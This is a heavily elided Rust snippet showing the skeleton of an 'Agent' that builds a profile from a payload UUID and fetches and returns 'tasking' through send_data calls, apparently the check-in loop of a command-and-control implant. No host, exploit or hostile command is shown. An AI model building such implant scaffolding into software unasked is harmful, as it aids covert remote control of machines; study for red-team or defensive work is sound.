...
impl Agent {
    ...
    pub fn new() -> Self {
        let profile = Profile::new(payloadvars::payload_uuid());
    ...
    pub fn get_tasking(&mut self) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
        ...
        let body = self.profile.send_data(&json_body)?;
    ...
    pub fn send_tasking(
        ...
        let json_response = self.profile.send_data(&req_payload)?;
